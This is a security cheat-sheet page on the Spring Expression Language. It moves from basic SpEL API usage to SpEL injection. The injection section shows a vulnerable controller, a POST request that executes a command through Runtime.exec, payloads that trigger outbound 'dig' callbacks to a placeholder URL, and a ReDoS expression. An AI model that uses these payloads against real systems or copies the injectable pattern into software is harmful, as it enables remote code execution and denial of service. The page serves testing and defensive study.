# Spring Expression Language (SpEL) overview

The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime.

{% embed url="https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html" %}

## Expression evaluation using Spring's expression interface

The following code introduces the SpEL API to evaluate the literal string expression `Hello World!`:

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello World'.concat('!')");
String message = (String) exp.getValue();
```

The value of the `message` variable is simply `Hello World!`.

## The EvaluationContext interface

The interface [EvaluationContext](https://docs.spring.io/spring-framework/docs/6.0.0-SNAPSHOT/javadoc-api/org/springframework/expression/EvaluationContext.html) is used when evaluating an expression to resolve properties, methods, fields, and to help perform type conversion. There are two main out-of-the-box implementations:

- [StandardEvaluationContext](https://docs.spring.io/spring-framework/docs/6.0.0-SNAPSHOT/javadoc-api/org/springframework/expression/spel/support/StandardEvaluationContext.html). A powerful and highly configurable `EvaluationContext` implementation. This context uses standard implementations of all applicable strategies, based on reflection to resolve properties, methods and fields.
- [SimpleEvaluationContext](https://docs.spring.io/spring-framework/docs/6.0.0-SNAPSHOT/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html). A basic implementation of `EvaluationContext` that focuses on a subset of essential SpEL features and customization options, targeting simple condition evaluation and in particular data binding scenarios.

```java
StandardEvaluationContext standardContext = new StandardEvaluationContext();
EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding ().build();
Expression exp = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('id')");
// execute 'id' command (standard context is used by default)
exp.getValue();
// execute 'id' command
exp.getValue(standardContext);
// receive error message
exp.getValue(simpleContext);
```

## Expression support for defining bean definitions

SpEL expressions can be used with XML or annotation based configuration metadata for defining BeanDefinitions. In both cases the syntax to define the expression is of the form `#{ <expression string> }`.

### XML based configuration

You can set a property or constructor-arg value using expressions.

```xml
<bean id="numberGuess" class="org.spring.samples.NumberGuess">
    <property name="randomNumber" value="#{ T(java.lang.Math).random() * 100.0 }"/>
    <property name="defaultLocale" value="#{ systemProperties['user.region'] }"/>
    <!-- other properties -->
</bean>
```

### Annotation-based configuration

The `@Value` annotation can be placed on fields, methods and method/constructor parameters to specify a default value.

```java
public static class FieldValueTestBean {
  @Value("#{ systemProperties['user.region'] }")
  private String defaultLocale;

  public void setDefaultLocale(String defaultLocale)
  {
    this.defaultLocale = defaultLocale;
  }

  public String getDefaultLocale()
  {
    return this.defaultLocale;
  }
}
```

## Language reference

{% embed url="https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html#expressions-language-ref" %}

# SpEL Injection

SpEL injection occurs when user controlled data is passed directly to the SpEL expression parser. For instance, the following method uses the standard context to evaluate SpEL expression:

```java
private static final SpelExpressionParser PARSER = new SpelExpressionParser();
private static final StandardEvaluationContext CONTEXT = new StandardEvaluationContext();

@PostMapping(path = "/")
public void method(@RequestBody String path, @RequestBody String value) {
    Expression expression = PARSER.parseExpression(path);
    expression.setValue(CONTEXT, value);
    // ...
}
```

As a result, you can gain code execution by sending the following `POST` request:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
...

{"path":"T(java.lang.Runtime).getRuntime().exec('touch executed').x", "value":"executed"}
```

If you have access to a source code, try to search for vulnerable code using the following keywords:

- `SpelExpressionParser`, `EvaluationContext`, `parseExpression`, `@Value("#{ <expression string> }")`
- `#{ <expression string> }`, `${<property>}`, `T(<javaclass>)`

If a source code is not available, it is worth checking the `metrics` and `beans` endpoints provided by the Spring Boot actuators.

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}

These endpoints can expand the list of available beans and the parameters they accept.

Additionally, try to use expressions in different elements of the service:

- Parameter names and values:
    - `variable[<expression string>]=123`
    - `variable=123&<expression string>=123`
    - `{"<expression string>":"123"}`
    - `{"variable":"<expression string>"}`
- HTTP headers:
    - `Cookie: cookie_name=<expression string>`
    - `Cookie: <expression string>=cookie_value`
    - `Private-Token: <expression string>`
- etc.

You can use the following payloads as the expression string:

```java
${1+3}
T(java.lang.Runtime).getRuntime().exec("dig <URL>")
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('dig <URL>')
new java.lang.ProcessBuilder({'dig <URL>'}).start()
${user.name}
```

## ReDoS

The `SimpleEvaluationContext` context prevents arbitrary code executing and writes a error message. However, you still can exploit the ReDoS attack.

```java
EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding ().build();
Expression exp = parser.parseExpression("'aaaaaaaaaaaaaaaaaaaaaaaa!'.matches('^(a+)+$')");
// ReDoS
exp.getValue(simpleContext);
```

# References

- [Spring Framework Docs: Spring Expression Language (SpEL)](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html)
- [SpEL Injection (Russia)](https://habr.com/ru/company/dsec/blog/433034/)
